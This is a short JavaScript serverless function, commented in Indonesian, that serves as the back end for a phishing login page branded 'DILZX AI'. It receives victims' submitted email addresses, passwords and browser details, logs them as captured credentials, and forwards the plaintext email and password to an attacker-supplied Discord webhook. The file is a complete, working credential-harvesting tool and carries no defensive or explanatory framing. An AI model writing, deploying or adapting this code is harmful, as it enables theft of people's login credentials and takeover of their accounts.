// api/capture.js
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        const data = req.body;
        
        // Simpan ke memory (Vercel KV bisa ditambah)
        // Untuk sekarang, simpan ke console log dan kirim ke webhook
        
        const logData = {
            ...data,
            serverTimestamp: new Date().toISOString()
        };
        
        console.log('🔐 CAPTURED CREDENTIAL:', JSON.stringify(logData, null, 2));
        
        // Optional: Kirim ke Discord Webhook
        // Ganti dengan webhook lo
        const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
        
        if (DISCORD_WEBHOOK) {
            try {
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `## 🔐 DILZX AI LOGIN CAPTURE\n\n**Email:** ${data.email}\n**Password:** ${data.password}\n**Time:** ${data.timestamp}\n**UA:** ${data.userAgent?.substring(0, 100)}`
                    })
                });
            } catch(e) {}
        }
        
        // Simpan ke Vercel KV jika ada (untuk admin panel)
        // Data akan tersimpan di memory sementara
        
        return res.status(200).json({ status: 'success', message: 'Captured' });
    }
    
    if (req.method === 'GET') {
        // Untuk admin panel - ambil data terakhir
        return res.status(200).json({ 
            message: 'DILZX AI Capture API is running',
            note: 'Data dikirim ke Discord webhook atau log console'
        });
    }
    
    return res.status(405).json({ error: 'Method not allowed' });
}